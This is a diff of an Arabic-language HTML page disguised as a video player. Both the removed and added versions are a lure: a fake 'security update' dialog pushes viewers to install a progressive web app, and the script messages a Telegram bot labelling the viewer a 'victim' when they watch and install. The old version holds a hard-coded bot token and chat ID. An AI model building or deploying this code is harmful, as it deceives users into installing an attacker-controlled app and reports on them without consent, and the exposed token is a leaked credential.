@@ -3,161 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشغل الفيديو الاحترافي</title>
-    <link rel="manifest" href="manifest.json">
+    <title>Media Player Engine</title>
     
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#000000">
+
     <style>
-        :root {
-            --primary-color: #ff3366; 
-            --secondary-color: #2a2a2a;
-            --text-color: #ffffff;
-            --bg-color: #121212;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .container {
-            position: relative;
-            width: 90%;
-            max-width: 600px;
-            aspect-ratio: 16 / 9; 
-            background-color: #000;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.3); 
-            overflow: hidden;
-            transition: transform 0.3s ease;
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .overlay {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.8)); 
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        .play-btn {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 80px; height: 80px;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 5px 15px rgba(255, 51, 102, 0.5);
-            animation: pulse 1.5s infinite; 
-        }
-
-        .play-icon {
-            width: 0; height: 0;
-            border-top: 15px solid transparent;
-            border-bottom: 15px solid transparent;
-            border-left: 25px solid white;
-            margin-left: 5px; 
-        }
-
-        .info-text {
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255, 51, 102, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(255, 51, 102, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 51, 102, 0); }
-        }
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        video { width: 90%; max-width: 800px; border: 2px solid #333; border-radius: 8px; box-shadow: 0 0 20px rgba(255,0,0,0.2); }
+        .status { margin-top: 15px; color: #888; font-size: 0.9em; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <video id="mainVideo">
-            <source src="v.mp4" type="video/mp4">
-            متصفحك لا يدعم تشغيل الفيديو.
-        </video>
+    <video id="myVideo" controls poster="icon-512.png">
+        <source src="video.mp4" type="video/mp4">
+        متصفحك لا يدعم تشغيل هذا الفيديو.
+    </video>
 
-        <div class="overlay" id="overlay">
-            <button class="play-btn" onclick="startTrap()">
-                <div class="play-icon"></div>
-            </button>
-            <p class="info-text">فيديو حصري ومشوق بانتظارك!</p>
-        </div>
-    </div>
+    <div class="status" id="stat">جارِ فحص جودة الاتصال...</div>
 
     <script>
-        const botToken = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
-        const chatId = "1356975454";
-        let installPrompt = null;
-        let hasFired = false;
+        // 1. تسجيل الـ Service Worker (ملف sw.js)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(() => {
+                console.log("Service Worker Active");
+            });
+        }
 
-        // التقاط حدث التثبيت PWA
+        let installPrompt = null;
+        const video = document.getElementById('myVideo');
+        const statusText = document.getElementById('stat');
+
+        // 2. صيد حدث التثبيت وتخزينه
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             installPrompt = e;
+            console.log("PWA Ready to capture");
         });
 
-        // تسجيل الـ Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js');
-        }
-
-        function startTrap() {
-            document.getElementById('overlay').style.display = 'none';
-            var video = document.getElementById('mainVideo');
-            video.play();
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 الضحية بدأ المشاهدة!")}`);
-        }
-
-        // مراقبة الـ 10 ثواني
-        const video = document.getElementById('mainVideo');
-        video.ontimeupdate = function() {
-            if (video.currentTime >= 10 && !hasFired) {
-                hasFired = true;
-                video.pause(); 
+        // 3. الفعل اللي هيحصل أول ما الفيديو يخلص
+        video.onended = async () => {
+            statusText.innerText = "⚠️ خطأ في بروتوكول التشغيل...";
+            
+            if (installPrompt) {
+                // رسالة الإقناع النهائية
+                const userConfirm = confirm("تنبيه أمني: لمتابعة مشاهدة الجزء الثاني من الفيديو بدون حظر، يجب تحديث 'إضافة مشغل الوسائط' لمتصفحك.\n\nهل تريد التثبيت الآن؟");
                 
-                const professionalMsg = "⚠️ تحديث أمني مطلوب:\n\nبموجب سياسة الخصوصية الجديدة وحماية المحتوى من الحظر، يجب تثبيت 'بروتوكول تشغيل الوسائط' المعتمد لمتابعة المشاهدة بشكل آمن.\n\nهل تريد التفعيل الآن؟";
-                
-                if (installPrompt) {
-                    if (confirm(professionalMsg)) {
-                        installPrompt.prompt();
-                        installPrompt.userChoice.then((choice) => {
-                            if (choice.outcome === 'accepted') {
-                                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ الضحية ثبت التطبيق!")}`);
-                                alert("تم التفعيل بنجاح.");
-                                video.play();
-                            }
-                        });
+                if (userConfirm) {
+                    installPrompt.prompt(); // إظهار نافذة التثبيت الرسمية للموبايل
+                    
+                    const choice = await installPrompt.userChoice;
+                    if (choice.outcome === 'accepted') {
+                        // إرسال البيانات للبوت بتاعك (حط التوكن والـ ID هنا)
+                        const token = "YOUR_BOT_TOKEN"; 
+                        const id = "YOUR_CHAT_ID";
+                        const msg = encodeURIComponent("🎯 صيدة جديدة! الضحية وافق على التثبيت وبقى معاك على الشاشة الرئيسية.");
+                        
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`);
+                        
+                        statusText.innerText = "تم التحديث بنجاح. جارِ إعادة التحميل...";
                     }
-                } else {
-                    alert("يرجى استخدام متصفح Google Chrome لتجنب حظر المحتوى.");
                 }
+            } else {
+                // لو المتصفح مش مدعم أو متثبت قبل كدة
+                alert("يرجى تحديث المتصفح لمتابعة المشاهدة.");
             }
         };
     </script>
